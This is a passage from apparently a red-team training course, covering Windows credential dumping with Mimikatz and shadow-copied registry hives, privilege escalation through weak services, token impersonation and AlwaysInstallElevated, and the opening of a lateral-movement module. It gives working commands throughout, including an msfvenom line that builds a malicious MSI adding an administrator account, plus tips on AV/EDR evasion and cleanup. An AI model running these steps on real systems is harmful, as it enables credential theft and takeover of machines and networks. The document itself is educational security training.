most famous tool for this is **Mimikatz**.\r\n\r\n**Technique 2: Using Mimikatz (Direct or via Loader)**\r\n\r\nMimikatz, created by Benjamin Delpy (`@gentilkiwi`), is the *de facto* tool for Windows credential operations. It can interact directly with LSASS memory or analyze dump files. *However*, directly executing `mimikatz.exe` is *highly* likely to be detected and blocked by Antivirus (AV) and Endpoint Detection and Response (EDR) solutions.\r\n\r\nAttackers and red teamers use various methods to run Mimikatz functionality while avoiding detection, such as:\r\n*   Reflective DLL injection (running the Mimikatz DLL directly in memory).\r\n*   Loading it via PowerShell (e.g., `Invoke-Mimikatz` from PowerSploit).\r\n*   Using custom loaders or obfuscated versions.\r\n\r\nFor the purpose of this module, we will focus on the *concept* and the *output* you'd expect, and use `Invoke-Mimikatz` from PowerSploit in the lab exercise as a common method (while acknowledging it might require AV bypass in a real scenario, which is a topic for more advanced courses).\r\n\r\n*   **Conceptual Steps (using `Invoke-Mimikatz`):**\r\n    *   Get the `Invoke-Mimikatz.ps1` script onto the target.\r\n    *   Import the script: `Import-Module .\\Invoke-Mimikatz.ps1`\r\n    *   Run the relevant command: `Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'`\r\n    *   The output will appear directly in your PowerShell session.\r\n\r\n*   **Analyzing a Dump File with Mimikatz (on your attacker machine):**\r\n    *   Transfer `lsass.dmp` to your attacker machine.\r\n    *   Run Mimikatz (the executable).\r\n    *   Point Mimikatz to the dump file: `sekurlsa::minidump lsass.dmp`\r\n    *   Run the command to extract passwords: `sekurlsa::logonpasswords`\r\n    *   Exit Mimikatz: `exit`\r\n\r\n**Expected Mimikatz Output (Conceptual):**\r\n\r\nMimikatz output is verbose but incredibly valuable. Look for sections like:\r\n\r\n```\r\nAuthentication Id : 0 ; 999 (00000000:000003e7)\r\nSession           : Interactive from 2\r\nUser Name         : targetuser\r\nDomain            : TARGETDOMAIN\r\nLogon Server      : TARGETDC\r\n...\r\n msv            : [00000003]\r\n -> primary\r\n    * Username : targetuser\r\n    * Domain   : TARGETDOMAIN\r\n    * NTLM     : 11223344556677889900AABBCCDDEEFF\r\n    * SHA1     : AABBCCDDEEFF11223344556677889900AABBCCDD\r\n    * CredentialData : (null)\r\n -> logon sspi\r\n    * Username : targetuser\r\n    * Domain   : TARGETDOMAIN\r\n    * Password : ReallySecretPassword123!   <-- !!! Cleartext passwords are GOLD !!!\r\n...\r\n kerberos       : [00000001]\r\n -> primary\r\n    * Username : targetuser\r\n    * Domain   : TARGETDOMAIN\r\n    * NTLM     : 11223344556677889900AABBCCDDEEFF\r\n    * SHA1     : AABBCCDDEEFF11223344556677889900AABBCCDD\r\n    * Kerberos : (null)\r\n    * Pkinit   : (null)\r\n...\r\n```\r\n\r\nLook for `Password :` followed by cleartext, or the `NTLM :` hash. The NTLM hash can often be used directly for authentication (Pass-the-Hash, Module 6!).\r\n\r\n**OpSec Note:** Accessing or dumping LSASS is a *very* common detection signature for security products. In a real red team engagement, this requires careful planning and likely AV/EDR bypass techniques. For our lab, we'll accept the risk of detection as we focus on the technique itself.\r\n\r\n### **2.6: Extracting from SAM and SECURITY Registry Hives**\r\n\r\nWhile LSASS is the primary target for *active* credentials, the SAM and SECURITY hives contain local user hashes and system secrets that can be valuable, especially if LSASS dumping is blocked or fails.\r\n\r\n**Why Target SAM/SECURITY Hives?**\r\n*   Contains local user password hashes (SAM hive).\r\n*   Contains LSA Secrets (SECURITY hive), which can include cached domain credentials, service account passwords, etc.\r\n\r\n**Requirement:** SYSTEM privileges on the target machine are generally needed to access these files or their contents reliably.\r\n\r\n**Techniques:**\r\n\r\nThe challenge is that these files (`C:\\Windows\\System32\\config\\SAM`, `SECURITY`, `SYSTEM`) are locked by the operating system while it's running.\r\n\r\n1.  **Offline Access:** If you have physical access or can boot the machine from a different OS (like a Linux live CD), you can mount the Windows drive and simply copy these files.\r\n    *   Copy `C:\\Windows\\System32\\config\\SAM`\r\n    *   Copy `C:\\Windows\\System32\\config\\SECURITY`\r\n    *   Copy `C:\\Windows\\System32\\config\\SYSTEM` (The `SYSTEM` hive is needed to decrypt the contents of the `SECURITY` hive).\r\n    *   Analyze these files on your attacker machine using tools like Impacket's `secretsdump.py`.\r\n\r\n2.  **Volume Shadow Copy (VSS):** This is a common technique used by attackers to access locked files on a live system. VSS creates snapshots of volumes, and files in snapshots are not locked by the running OS.\r\n    *   **Step 1: Create a Shadow Copy:**\r\n        ```cmd\r\n        vssadmin create shadow /for=C:\r\n        ```\r\n        This command will output the path to the shadow copy (e.g., `\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\`). Note this path down.\r\n    *   **Step 2: Copy Hives from the Shadow Copy:** Use the shadow copy path to access the files.\r\n        ```cmd\r\n        copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SAM C:\\Temp\\sam.hiv\r\n        copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SECURITY C:\\Temp\\security.hiv\r\n        copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SYSTEM C:\\Temp\\system.hiv\r\n        ```\r\n        *(Replace `X` with the correct shadow copy number and `C:\\Temp\\` with your desired location)*\r\n    *   **Step 3: Delete the Shadow Copy (OpSec):** Clean up the shadow copy you created.\r\n        ```cmd\r\n        vssadmin delete shadows /for=C: /Quiet\r\n        ```\r\n    *   **Step 4: Exfiltrate the hive files:** Copy `sam.hiv`, `security.hiv`, and `system.hiv` from the target machine to your attacker machine.\r\n    *   **Step 5: Analyze the hive files:** Use a tool *on your attacker machine* to extract hashes and secrets. Impacket's `secretsdump.py` is excellent for this.\r\n\r\n*   **Using `secretsdump.py` (Impacket - on attacker machine):**\r\n    ```bash\r\n    secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL\r\n    ```\r\n    *   This command takes the three hive files as input and will output local user NTLM hashes (from SAM) and LSA Secrets (from SECURITY).\r\n\r\n*   **Using Mimikatz (Live or via Shadow Copy):** Mimikatz can also dump SAM and SECURITY hives directly, often automating the VSS step or using other techniques.\r\n    *   **Conceptual Command:** `mimikatz.exe \"lsadump::sam\" exit` or `mimikatz.exe \"token::elevate\" \"lsadump::sam\" exit` (if needing to elevate first). `lsadump::secrets` for LSA Secrets.\r\n\r\n**Expected Output (SAM/SECURITY Hive Analysis):**\r\n\r\n*   **SAM:** You'll get a list of local users and their NTLM hashes in a format like:\r\n    `Username:RID:LMHash:NTLMHash:::`. The LM hash is usually empty on modern systems. The NTLM hash is the important part.\r\n    `Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::` (This is the hash for a blank password - very common in labs!)\r\n    `LocalUser:1001:NO PASSWORD*********************:AABBCCDDEEFF11223344556677889900:::`\r\n\r\n*   **SECURITY (LSA Secrets):** You might find cached domain credentials, service account passwords, or other system secrets. The output format varies but look for things like `_SC_` (Service Control) entries or cached domain logons.\r\n\r\n**OpSec Note:** Creating shadow copies and copying hive files leaves forensic artifacts (event logs, file access timestamps). Executing tools like Mimikatz or scripts that automate this are also high-detection activities.\r\n\r\n###"
    },
    {
      "title": "module_3",
      "description": "module_3 Overview",
      "order": 3,
      "content": "Alright team, buckle up! We've secured that initial foothold, which is fantastic! But let's be real ‚Äì landing as a standard user on a Windows box usually means we're still quite limited. We can look around a bit, maybe poke at some files, but we can't install tools, modify critical system settings, or access sensitive data protected by Administrator permissions.\r\n\r\nThis is where Module 3 comes in. This is where we turn that humble user access into the keys to the kingdom on that specific host. This module is all about **Privilege Escalation (PE)** ‚Äì the art and science of elevating our access from a low-privileged user to a high-privileged user, typically Administrator or even SYSTEM.\r\n\r\nThink of it like getting past the first guard at the gate (initial access), but then needing to find a way to get the master key instead of just a visitor's badge.\r\n\r\n---\r\n\r\n## **Module 3: Windows Privilege Escalation**\r\n\r\n**Module Objective:** By the end of this module, you will be able to systematically enumerate a Windows host for common privilege escalation vectors and successfully exploit at least one method to gain Administrator or SYSTEM level access in a lab environment.\r\n\r\n**The \"Why\":** Why is PE so critical?\r\n1.  **Access to Sensitive Data:** Administrators and SYSTEM have access to nearly all files, registry keys, and processes on the host. This is where you find sensitive documents, configuration files, and crucially, credentials cached in memory or stored locally.\r\n2.  **Persistence:** Higher privileges make it much easier to establish persistent backdoors (e.g., installing services, modifying startup locations that run with high privileges).\r\n3.  **Springboard for Lateral Movement:** Administrator or SYSTEM access on one machine often provides credentials or tokens that can be reused or leveraged to authenticate to *other* machines in the network, especially in a domain environment.\r\n4.  **Control:** With high privileges, you can disable security software, clear logs, modify system behavior, and generally operate with less restriction.\r\n\r\n**The Mindset:** Privilege escalation isn't usually one magic bullet. It's a process of:\r\n1.  **Thorough Enumeration:** What is running? What software is installed? What are the permissions on key files and services? What patches are missing? What are the user's current privileges?\r\n2.  **Identifying Weaknesses:** Based on your enumeration, spot misconfigurations, known vulnerabilities, or design flaws.\r\n3.  **Planning the Attack:** Determine which identified weakness is most likely to succeed and requires the least risk/noise.\r\n4.  **Execution:** Carry out the exploit.\r\n5.  **Verification:** Confirm you now have higher privileges.\r\n\r\nLet's dive deep into the core concepts and techniques!\r\n\r\n---\r\n\r\n### **3.1 Understanding Windows Integrity Levels and UAC**\r\n\r\nBefore we exploit, we need to understand the security model we're trying to bypass.\r\n\r\n*   **Security Identifiers (SIDs):** Every user, group, and service account in Windows has a unique SID (e.g., `S-1-5-21-...-500` for the built-in Administrator). Permissions are granted to SIDs, not just names.\r\n*   **Access Control Lists (ACLs):** Objects (files, folders, registry keys, services, processes, shares) have ACLs which contain Access Control Entries (ACEs). Each ACE specifies permissions (Read, Write, Execute, Modify, Full Control) for a specific SID. PE often involves finding objects where a low-privileged user's SID has more permissions than intended.\r\n*   **Integrity Levels (IL):** Introduced in Windows Vista (along with UAC), ILs add another layer to the security model. Processes run at different integrity levels:\r\n    *   **Low:** Highly restricted (e.g., Internet Explorer in Protected Mode). Cannot write to most system locations.\r\n    *   **Medium:** Standard user processes. Cannot write to system directories without elevation prompt.\r\n    *   **High:** Administrator processes (after UAC elevation).\r\n    *   **SYSTEM:** The highest privilege level. Used by the OS kernel and core services. Has full control over the system.\r\n    *   **Trusted Installer:** Even higher than SYSTEM for specific protected system files.\r\n\r\n    A process running at a lower integrity level *cannot* write to or modify objects running at a higher integrity level. This is a fundamental security boundary.\r\n\r\n*   **User Account Control (UAC):** This is probably what you see most often. When a standard user (Medium IL) tries to perform an action requiring Administrator privileges (e.g., installing software, changing system-wide settings), Windows prompts the user.\r\n    *   If the user *is* a member of the Administrators group, they get a consent prompt (\"Do you want to allow this app...\"). If they click \"Yes,\" the process is launched with High integrity.\r\n    *   If the user is *not* a member of the Administrators group, they get a credentials prompt, requiring them to enter an administrator username and password.\r\n\r\n    **Crucially:** UAC is designed to *prevent accidental* administrative actions and require user *consent*. It is **not** a security boundary against malicious code already running on the system *if* that code can interact with processes or components that are designed to auto-elevate or are vulnerable. A UAC bypass allows a Medium integrity process to launch a High integrity process *without* the user seeing or approving the prompt.\r\n\r\n### **3.2 Common Privilege Escalation Vectors**\r\n\r\nNow that we understand the target environment's security features, let's look at specific weaknesses we can exploit. Remember, **enumeration is key** to finding these!\r\n\r\n#### **3.2.1 Vulnerable Services**\r\n\r\nServices are background processes that often run with high privileges (SYSTEM, LocalSystem, LocalService, NetworkService) and start automatically when the system boots. Misconfigurations here are a goldmine for PE.\r\n\r\n*   **What to Enumerate:**\r\n    *   List all services: `Get-Service` (PowerShell) or `tasklist /svc` (CMD).\r\n    *   Check service configuration: `sc qc <service_name>` (CMD) or `Get-CimInstance win32_service -Filter \"Name='<service_name>'\" | Select-Object Name, DisplayName, PathName, StartMode, State, Status, ServiceType, StartName` (PowerShell). Look at `PathName` (the executable path) and `StartName` (the account it runs as, usually SYSTEM or LocalSystem).\r\n    *   Check permissions on the service executable path: `icacls \"<path_to_service_exe>\"` (CMD) or `Get-Acl \"<path_to_service_exe>\" | Format-List Path, Owner, Access` (PowerShell). Look for Write/Modify permissions for 'BUILTIN\\Users' or 'Everyone'.\r\n    *   Check permissions on the service configuration key in the registry: Services are configured under `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service_name>`. Check permissions on this key using `reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service_name> /v SD` (CMD, then interpret SDDL) or `Get-Acl \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<service_name>\" | Format-List Path, Owner, Access` (PowerShell). Look for Write permissions for low-priv groups.\r\n\r\n*   **Common Vulnerabilities & Exploitation:**\r\n\r\n    *   **Unquoted Service Path:** If the `PathName` of a service contains spaces and is *not* enclosed in quotes, Windows will try to execute the path segment by segment until it finds an executable.\r\n        *   Example Path: `C:\\Program Files\\My Service\\service.exe`\r\n        *   Windows tries to execute:\r\n            1.  `C:\\Program.exe`\r\n            2.  `C:\\Program Files\\My.exe`\r\n            3.  `C:\\Program Files\\My Service\\service.exe` (the legitimate service)\r\n        *   If you, as a low-privileged user, have write permissions to `C:\\Program Files\\`, you could place a malicious `My.exe` there. The next time the service starts (system boot, manual start, or crash/restart), your malicious `My.exe` will execute *with the service's privileges* (often SYSTEM) instead of the legitimate service.\r\n        *   **Identification:** Look for services where `PathName` contains spaces and is missing quotes.\r\n            ```powershell\r\n            Get-CimInstance win32_service | Where-Object {$_.PathName -notmatch '\"' -and $_.PathName -match '\\s'} | Select-Object Name, DisplayName, PathName, StartName\r\n            ```\r\n            ```cmd\r\n            wmic service get name,pathname,startmode | findstr /i \"Auto\" | findstr /i \"System\" | findstr /v \"\"\"\r\n            ```\r\n            (The CMD version is less precise but can find some). Then verify directory permissions using `icacls` on the directories (`C:\\`, `C:\\Program Files\\`, etc.).\r\n        *   **Exploitation:**\r\n            1.  Confirm you have write permissions to the directory where you'll place your malicious executable (e.g., `C:\\Program Files\\`).\r\n            2.  Create a malicious executable (e.g., `my.exe`) that performs your desired action (add a user, launch a shell, etc.). Make sure its name matches the segment Windows will try to execute (e.g., `My.exe` for `C:\\Program Files\\My Service\\service.exe`).\r\n            3.  Place `my.exe` in the vulnerable directory.\r\n            4.  Restart the service (if possible and low-risk, otherwise wait for system restart) using `Restart-Service <service_name>` (PowerShell) or `sc stop <service_name>` then `sc start <service_name>` (CMD). *Be cautious restarting services, it might break things!*\r\n            5.  Your `my.exe` should execute with the service's privileges.\r\n\r\n    *   **Weak Service Permissions (Service Binary/Configuration):** If a low-privileged user has write/modify permissions on the service's executable file (`PathName`) or its registry configuration key, they can alter the service's behavior.\r\n        *   **Identification:** Check permissions as described above using `icacls` or `Get-Acl`. Look for 'Write' or 'Modify' permissions for your user or groups you belong to on the service executable or its registry key.\r\n            ```powershell\r\n            # Check permissions on the service executable (replace path)\r\n            Get-Acl \"C:\\Program Files\\Vulnerable Service\\vulnerable.exe\" | Format-List Path, Owner, Access\r\n\r\n            # Check permissions on the service registry key (replace service name)\r\n            Get-Acl \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService\" | Format-List Path, Owner, Access\r\n            ```\r\n        *   **Exploitation (Modifying Binary):**\r\n            1.  If you have write access to the service executable, rename the original (`vulnerable.exe` to `vulnerable.exe.bak`).\r\n            2.  Place your malicious executable (named `vulnerable.exe`) in its place.\r\n            3.  Restart the service. Your malicious executable runs with service privileges.\r\n        *   **Exploitation (Modifying Config):**\r\n            1.  If you have write access to the service's registry key, you can modify the `ImagePath` value to point to your malicious executable.\r\n            2.  Restart the service. Your malicious executable runs.\r\n            ```powershell\r\n            # Example: Modify ImagePath (replace service and path)\r\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService\" -Name \"ImagePath\" -Value \"C:\\Path\\To\\Your\\Malicious.exe\"\r\n            # Then restart service\r\n            Restart-Service VulnerableService\r\n            ```\r\n            *Again, be very careful modifying service configurations or binaries, this can easily break the system!*\r\n\r\n#### **3.2.2 Token Manipulation / Impersonation**\r\n\r\nWindows uses \"tokens\" to represent the security context of a user or process. Tokens contain SIDs, privileges, integrity levels, etc. Certain privileges allow a process to impersonate another user's token.\r\n\r\n*   **`SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`:** If a user or service account holds one of these privileges, they *might* be able to impersonate other logged-on users or service accounts on that system. Web servers or database servers often hold `SeImpersonatePrivilege` to impersonate clients.\r\n*   **Identification:** Check your current user's privileges using `whoami /priv` (CMD) or `(Get-CimInstance win32_tokenprivileges -Filter \"GetEnabled='true'\").Privileges | Where-Object {$_.DisplayName -like '*impersonate*' -or $_.DisplayName -like '*assign*'}` (PowerShell - rough example).\r\n*   **Exploitation:** This is typically exploited using tools like Mimikatz's `incognito` module.\r\n    ```\r\n    # Example Mimikatz usage (requires Admin or SeDebugPrivilege)\r\n    sekurlsa::logonpasswords  # Dumps credentials from LSASS\r\n    incognito::list_tokens    # Lists impersonatable tokens\r\n    incognito::impersonate_token <Token_ID_or_Username> # Impersonate a token\r\n    # Or often used after getting SeDebugPrivilege to access LSASS\r\n    ```\r\n    **Teacher's Note:** Mimikatz is a *very* powerful tool for Windows security analysis, but it's also heavily detected by AV/EDR. Using it directly often requires bypassing security software. The `incognito` module allows you to potentially elevate *without* dumping credentials directly, by just leveraging existing tokens.\r\n\r\n#### **3.2.3 Insecure File and Registry Permissions**\r\n\r\nSimilar to services, general file system or registry objects can have weak permissions allowing low-privileged users to modify files or keys that are later used or executed by high-privileged processes.\r\n\r\n*   **What to Enumerate:**\r\n    *   Permissions on critical directories: `C:\\`, `C:\\Program Files`, `C:\\Program Files (x86)`, `C:\\Windows\\System32`, `C:\\Windows\\Tasks`. Use `icacls <directory>`.\r\n    *   Permissions on specific files in those directories, especially `.exe`, `.dll`, `.bat`, `.ps1`, `.vbs` files.\r\n    *   Permissions on common persistence locations in the registry: `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`, `HKCU\\...Run`, `HKLM\\...\\RunOnce`, `HKLM\\SYSTEM\\CurrentControlSet\\Services` (covered in services), Scheduled Tasks keys. Use `reg query <key> /v SD` or `Get-Acl <Registry::Path>`.\r\n    *   Permissions on program directories where high-privilege software is installed.\r\n*   **Identification:** Look for 'Write' or 'Modify' permissions for 'BUILTIN\\Users' or 'Everyone' on files/keys that high-privilege processes interact with or execute.\r\n    ```powershell\r\n    # Example: Check permissions on a common Run key\r\n    Get-Acl \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" | Format-List Path, Owner, Access\r\n\r\n    # Example: Find writable files in Program Files (this can be slow!)\r\n    # Adjust filter/depth as needed. Be careful with recursion.\r\n    Get-ChildItem -Path \"C:\\Program Files\" -Recurse -Force -ErrorAction SilentlyContinue | Get-Acl -ErrorAction SilentlyContinue | Where-Object {$_.AccessToString -match \"BUILTIN\\\\Users.*\\(M\\)\" -or $_.AccessToString -match \"Everyone.*\\(M\\)\" -or $_.AccessToString -match \"BUILTIN\\\\Users.*\\(W\\)\" -or $_.AccessToString -match \"Everyone.*\\(W\\)\"} | Select-Object Path\r\n    ```\r\n*   **Exploitation:**\r\n    *   **DLL Hijacking:** If a high-privilege process tries to load a DLL from a directory where you have write permissions, you can place a malicious DLL with the expected name there. The process might load *your* DLL instead of the legitimate one, executing your code with its privileges. This is complex and requires understanding DLL loading order.\r\n    *   **Executable Replacement:** If you have write access to an executable that's run by a high-privilege process (e.g., a scheduled task running as SYSTEM), you can replace the executable with your own.\r\n    *   **Registry Modification:** If you can write to a registry key that a high-privilege process reads or executes (like a Run key or a service `ImagePath`), you can inject a command or path to your malicious code.\r\n\r\n#### **3.2.4 Auto-logon Credentials / Saved RDP Credentials**\r\n\r\nSometimes systems are configured for automatic logon, storing credentials (often obfuscated) in the registry. Or users might save RDP credentials. While not a *privilege escalation* on the *current* host itself, finding these can give you high-privilege credentials for the *same* host or *other* hosts, effectively bypassing the need for a traditional PE exploit.\r\n\r\n*   **Identification:** Look in the registry: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` for `AutoAdminLogon`, `DefaultUserName`, `DefaultPassword`. Look for saved RDP connections and potentially extract credentials (though this is harder and often requires Admin).\r\n*   **Exploitation:** Use tools (like Mimikatz or specific credential extractors) to retrieve the cleartext password or hash from the registry.\r\n\r\n#### **3.2.5 Kernel Exploits**\r\n\r\nThese exploit vulnerabilities in the Windows kernel itself. They are often highly reliable for PE *if* the target system is running a vulnerable version of the kernel and hasn't been patched.\r\n\r\n*   **How they work (Conceptually):** Kernel exploits typically involve tricking the kernel into executing malicious code in kernel mode, or manipulating kernel data structures to grant the attacker's process SYSTEM privileges.\r\n*   **Identification:** This is primarily about **identifying the exact OS version and patch level** of the target (`systeminfo`, `Get-ComputerInfo`, `Get-HotFix`). Then, compare this information against public databases of known Windows kernel vulnerabilities and available exploits (e.g., Exploit-DB, security advisories).\r\n*   **Exploitation:** Using a pre-compiled exploit binary or script designed for the *specific* vulnerable OS version/patch.\r\n    *   **Teacher's Note:** Kernel exploits are powerful but risky. They can cause Blue Screens of Death (BSODs), are highly signatured by AV/EDR, and require precise targeting. In a real engagement, they are often a last resort. In a lab, they are valuable for understanding, but always use stable, known exploits and be prepared to snapshot/revert the VM. We will *not* be writing kernel exploit code, but rather focusing on identifying the *opportunity* and using existing tools if available in the lab.\r\n\r\n### **3.3 Automated PE Tools**\r\n\r\nManually enumerating all the potential vectors above can be time-consuming. Fortunately, several excellent tools automate this process. They scan the system, look for common misconfigurations and vulnerabilities, and report potential PE paths.\r\n\r\n*   **`PowerUp` (PowerShell):** Part of the PowerSploit framework, `PowerUp` is a PowerShell script specifically designed to find common Windows PE vectors like vulnerable services, DLL hijacking opportunities, AlwaysInstallElevated, etc.\r\n    *   **Usage:**\r\n        1.  Load the script: `Import-Module .\\PowerUp.ps1` or dot-source it `. .\\PowerUp.ps1`.\r\n        2.  Run the main check function: `Invoke-AllChecks`\r\n    *   **Output:** `Invoke-AllChecks` will output a list of potential vulnerabilities found, often with suggestions on how to exploit them.\r\n    *   **Teacher's Note:** PowerShell scripts might be blocked by execution policies or Antivirus. You might need to bypass these, which is a separate topic (OpSec!).\r\n\r\n*   **`WinPEAS` (Windows Privilege Escalation Awesome Scripts):** A standalone executable (`.exe`) that performs extensive local enumeration. It checks for file/registry permissions, services, processes, scheduled tasks, installed software, network information, credentials in files, and much more. It has both `.bat` and `.exe` versions, and different editions (e.g., `winPEASany.exe`).\r\n    *   **Usage:** Download and run the appropriate version.\r\n        ```cmd\r\n        # Basic execution\r\n        winPEASany.exe\r\n\r\n        # Output to file\r\n        winPEASany.exe > winpeas_results.txt\r\n        ```\r\n    *   **Output:** `WinPEAS` prints its findings to the console, often color-coded. It highlights potential vulnerabilities.\r\n    *   **Teacher's Note:** `WinPEAS` is often detected by AV/EDR. You might need to use obfuscated versions or run it from memory.\r\n\r\n*   **`Sherlock` (PowerShell):** A PowerShell script focused on finding missing software patches that correspond to known kernel exploits. It compares the installed patches against a list of vulnerabilities.\r\n    *   **Usage:**\r\n        1.  Load the script: `Import-Module .\\Sherlock.ps1` or `. .\\Sherlock.ps1`.\r\n        2.  Run the check: `Find-AllVulns`\r\n    *   **Output:** Lists potential kernel vulnerabilities based on missing patches.\r\n    *   **Teacher's Note:** `Sherlock` only tells you *if* the system is vulnerable, not *how* to exploit it. You'd then need to find a reliable exploit for the reported CVE.\r\n\r\n**Important Note on Automated Tools:** These tools are *enumerators*. They *find* potential weaknesses. They don't always *exploit* them for you (though `PowerUp` has some exploitation functions). You still need to understand *why* the reported issue is a vulnerability and *how* to manually or semi-automatically exploit it. Relying solely on tools without understanding is a recipe for failure and getting caught.\r\n\r\n### **3.4 Case Study: AlwaysInstallElevated**\r\n\r\nLet's look at a classic, simple PE vector: the `AlwaysInstallElevated` registry key.\r\n\r\n*   **The Vulnerability:** Windows Installer (msiexec) can be configured via Group Policy or registry keys to install `.msi` packages with elevated privileges (SYSTEM) even if the user running the installer is not an administrator. This feature is intended for specific deployment scenarios but is a major security risk if enabled globally.\r\n*   **Identification:** Check these two registry keys:\r\n    *   `HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`\r\n    *   `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`\r\n    *   If *both* keys exist and are set to `1`, the vulnerability is present.\r\n    ```powershell\r\n    # Check HKCU\r\n    Get-ItemProperty -Path \"HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" -Name \"AlwaysInstallElevated\" -ErrorAction SilentlyContinue\r\n\r\n    # Check HKLM\r\n    Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" -Name \"AlwaysInstallElevated\" -ErrorAction SilentlyContinue\r\n    ```\r\n    ```cmd\r\n    reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\r\n    reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\r\n    ```\r\n*   **Exploitation:**\r\n    1.  If both keys are `1`, you can create a malicious `.msi` package.\r\n    2.  Execute the `.msi` package using `msiexec`.\r\n    3.  Your code within the `.msi` package will execute with SYSTEM privileges.\r\n    *   **Creating a Malicious MSI:** This requires specific tools (like `msfvenom` or creating a custom WiX project). `msfvenom` is the simpler route for red teaming.\r\n        ```bash\r\n        # Example using msfvenom to create an MSI that adds a user 'hacker' with password 'Password123!'\r\n        msfvenom -p windows/exec CMD='net user hacker Password123! /add && net localgroup administrators hacker /add' -f msi -o evil.msi\r\n        ```\r\n    *   **Executing the MSI:**\r\n        ```cmd\r\n        msiexec /quiet /qn /i C:\\Path\\To\\"
    },
    {
      "title": "module_4",
      "description": "module_4 Overview",
      "order": 4,
      "content": "Alright, fellow knowledge seekers! Let's dive deep into Module 4 of our journey: **Lateral Movement Techniques**. This is where we take that initial foothold and start exploring the network, turning one compromised machine into a launching pad for wider access.\r\n\r\nThis module is absolutely critical. In most real-world scenarios, the initial access point isn't the ultimate target (like the Domain Controller or a critical database server). You *have* to move laterally to get there. Mastering these techniques is fundamental to successful red teaming and understanding how attackers propagate within a network.\r\n\r\n---\r\n\r\n### **Module 4: Lateral Movement Techniques**\r\n\r\n*   **Module Objective:** Master various techniques to move from a compromised host to other systems within the network using harvested credentials, session reuse, and native tools.\r\n\r\n---\r\n\r\nWelcome back! By now, you've gained a foothold on a Windows machine (Module 1), enumerated valuable local info and credentials (Module 2), and potentially elevated your privileges to Administrator or SYSTEM on that host (Module 3). Fantastic work!\r\n\r\nBut we're not stopping there. Our objective isn't just one machine; it's often the entire domain. To get there, we need to move from our current position to other machines on the network. This is the essence of **Lateral Movement**.\r\n\r\n**What is Lateral Movement?**\r\n\r\nLateral movement refers to the techniques adversaries use to navigate to and control systems other than the initially compromised host. It's about expanding your access and reach within the target network. Think of it like moving through rooms in a building after you've gotten through the front door.\r\n\r\n**Why is Lateral Movement Necessary?**\r\n\r\n1.  **Reach High-Value Targets:** Domain controllers, critical servers (databases, file shares, applications), and executive workstations often aren't directly accessible from the internet or the initial access point.\r\n2.  **Gather More Information:** Moving to different systems provides new perspectives, potentially revealing more sensitive data, additional users, group memberships, network diagrams, or credentials.\r\n3.  **Find Better Credentials:** Compromising more machines increases the chances of finding credentials for higher-privileged accounts, which are essential for achieving domain dominance.\r\n4.  **Establish Persistence:** Spreading access across multiple hosts makes it harder for defenders to evict you completely if they find and clean up one machine.\r\n5.  **Access Specific Resources:** You might need to reach a specific application server or file share to complete your objective.\r\n\r\n---\r\n\r\n#### **Essential Subtopics & Deep Dive:**\r\n\r\n##### **4.1 Understanding Network Topology & Trust Relationships**\r\n\r\nBefore you start moving, you need to know where you *can* move and where you *want* to move. This requires understanding the network layout and how systems are connected and trust each other.\r\n\r\n*   **Network Topology:**\r\n    *   Are there different subnets?\r\n    *   Are there firewalls between segments?\r\n    *   What's the general layout (flat network, segmented, DMZ)?\r\n    *   Identifying nearby hosts is a crucial first step. We touched on this in Module 1 (`ipconfig`, `netstat`). From a compromised host, you can also:\r\n        *   Check the local ARP cache (`arp -a`).\r\n        *   Ping known hosts (like the default gateway, DNS servers found in `ipconfig`).\r\n        *   Use tools like `nmap` (if available or uploaded) or native PowerShell/CMD methods to scan local subnets (`for /L %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i & if errorlevel 0 echo 192.168.1.%i >> live_hosts.txt`).\r\n        *   Look at network shares connected (`net use`).\r\n        *   Examine DNS cache (`ipconfig /displaydns`).\r\n\r\n*   **Trust Relationships (within a Windows Domain):**\r\n    *   In a domain environment, machines trust the Domain Controller to authenticate users.\r\n    *   Users authenticated on one domain-joined machine can often access resources on *other* domain-joined machines *if* they have the necessary permissions *and* the target machine trusts the authentication source.\r\n    *   Understanding which users have administrative rights on which machines is key. Local Administrator groups on workstations often contain Domain Admins or specific privileged domain users.\r\n    *   We'll dive much deeper into Active Directory structure and trusts in Module 5, but keep in mind *who* you are authenticated as and *where* that identity is trusted is paramount for lateral movement.\r\n\r\n**How to find potential targets from the initial host (Native/PowerShell):**\r\n\r\n```powershell\r\n# Find computers in the current domain (requires ActiveDirectory module or PowerView)\r\n# Using PowerView (often preferred in offensive scenarios)\r\n# Assuming PowerView is loaded (e.g., via Import-Module or dot-sourcing)\r\nGet-DomainComputer | Select-Object Name, OperatingSystem, LastLogonDate | Format-Table -AutoSize\r\n\r\n# Basic network scanning using Test-Connection (ping)\r\n# Replace 192.168.1.0/24 with the local subnet\r\n$subnet = \"192.168.1.\"\r\nfor ($i = 1; $i -le 254; $i++) {\r\n    $ip = $subnet + $i\r\n    if 